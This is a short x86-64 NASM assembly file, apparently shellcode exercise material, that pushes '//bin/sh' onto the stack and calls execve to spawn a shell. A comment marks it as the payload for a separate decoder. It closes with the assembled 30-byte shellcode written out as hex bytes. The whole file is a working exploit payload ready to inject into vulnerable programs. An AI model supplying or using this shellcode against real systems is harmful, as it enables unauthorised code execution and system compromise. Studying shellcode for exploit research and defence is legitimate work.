; Simple execve to spawn a shell
; Used as payload in decode.nasm
global _start
section .text

_start:
    xor rax, rax
    push rax
    pop rdx         
    push rdx
    mov rbx, 0x68732f6e69622f2f ; build //bin/sh
    push rbx            ; copy ¨//bin/sh¨ string to stack
    mov rdi, rsp        ; get the address for /bin/sh string
    push rax            ; build args array, by pushing NULL
    push rdi            ; then pushing string address
    mov rsi, rsp        ; args array address
    add eax, 59         ; execve
    syscall
    
; Shellcode (30 bytes) - 0x48,0x31,0xc0,0x50,0x5a,0x52,0x48,0xbb,0x2f,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x53,0x48,0x89,0xe7,0x50,0x57,0x48,0x89,0xe6,0x83,0xc0,0x3b,0x0f,0x05

